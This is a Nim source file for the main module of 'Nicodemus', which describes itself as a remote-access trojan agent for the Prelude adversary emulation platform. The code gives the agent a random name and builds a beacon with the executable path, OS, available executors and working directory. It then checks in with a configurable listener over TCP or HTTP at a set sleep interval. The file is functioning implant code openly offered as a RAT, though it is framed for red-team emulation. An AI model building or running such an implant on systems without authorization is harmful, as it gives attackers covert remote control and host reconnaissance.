# import sockets
import parseopt
import strutils
import strformat
import random
import tables
import net
import os
from times import getTime, toUnix, nanosecond
from sockets/contact import Contact, Beacon, Instruction
from sockets/rawtcp import tcpCommunicate
from sockets/rawudp import udpCommunicate
from sockets/rawhttp import httpCommunicate, checkValidHTTPTarget
from util/executors import determineExecutors

# Modify this value on each compile for a unique hash.
let key = "Adversary Emulsion Total Landscaping"

proc pickName(chars: int): string =
    ## Generate a random name.
    ## 
    let now = getTime()
    var r = initRand(now.toUnix * 1_000_000_000 + now.nanosecond)
    var letterBytes: string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in 1 .. chars:
        result = result & letterBytes[r.rand(len(letterBytes)-1)]

proc verifyAddress(address: string, contact: string): bool =
    ## Checks if the address is a valid IP/Port.
    ## 
    if contact == "http":
        return checkValidHTTPTarget(address)
    else:
        var ipAndPort: seq[string]
        ipAndPort = address.split(":")
        if isIpAddress(ipAndPort[0]):
            if 0 < parseInt(ipAndPort[1]) and parseInt(ipAndPort[1]) < 65535:
                return true

proc buildBeacon(name: string, group: string): contact.Beacon = 
    ## Builds an agent beacon.
    ## 
    ## hostOS and hostCPU are constants defined by the compiler.
    ## See: https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    var pwd: string = os.getCurrentDir()
    var executable: string = os.getAppFilename()
    var links: seq[Instruction]
    result = Beacon(Name: name, 
                    Location: executable, 
                    Platform: hostOS, 
                    Executors: determineExecutors(), 
                    Pwd: pwd, 
                    Range: group, 
                    Links: links)

proc communicate(contact: Contact, address: string, sleep: int, beacon: Beacon) =
    ## Executes the agent communication channel.
    ## 
    if contact.protocol == "tcp":
        tcpCommunicate(address = address, sleep = sleep, beacon = beacon)
    # elif contact.protocol == "udp":
    #     udpCommunicate(address = address, sleep = sleep, beacon = beacon)
    elif contact.protocol == "http":
        httpCommunicate(address = address, sleep = sleep, beacon = beacon)
    else:
        echo "Invalid contact."
        system.quit(0)

proc writeHelp() =
    ## Writes the cli help page.
    ## 
    echo """Nicodemus
    A Nim RAT for the Prelude adversary emulation platform.

    Usage: nicodemus [-h] [-v] [--name foo] [--contact tcp] [--address 0.0.0.0:2323] [--range red] [--sleep 60]

    optional arguments:
        -h, --help  show this help message and exit
        -v, --version  show the agent version and exit
        --name  the name of the agent
        --contact  the network protocol
        --address  the ip:port of the listening socket
        --sleep  the number of seconds between beacons
    """

proc writeVersion() =
    ## Writes the agent version.
    ## 
    echo """Nicodemus

    Version: 0.0.1
    """


proc main() =
    var name: string = pickName(10)
    var contact: string = "tcp"
    var address: string = "0.0.0.0:2323"
    var group: string = "red"
    var sleep: int = 5

    var p = initOptParser("", shortNoVal = {'h', 'v'}, longNoVal = @["help", "version"])
    while true:
        p.next()
        case p.kind
        of cmdEnd: break
        of cmdShortOption, cmdLongOption:
            case p.key
            of "help", "h": writeHelp()
            of "version", "v": writeVersion()
            of "name": name = p.val
            of "contact": contact = p.val
            of "address": address = p.val
            of "range": group = p.val
            of "sleep": sleep = parseInt(string(p.val))
            else: writeHelp(); break
        of cmdArgument: writeHelp(); break
    
    if not verifyAddress(address, contact):
        echo "Invalid address."
        system.quit(0)
    
    echo fmt("[{contact}] agent at PID {os.getCurrentProcessId()} using key {key}")
    
    # Initialize the agent beacon.
    var beacon: Beacon = buildBeacon(name=name, group=group)

    # Initialize the communication channel.
    var agentContact = Contact(protocol: contact)
    communicate(agentContact, address, sleep, beacon)

main()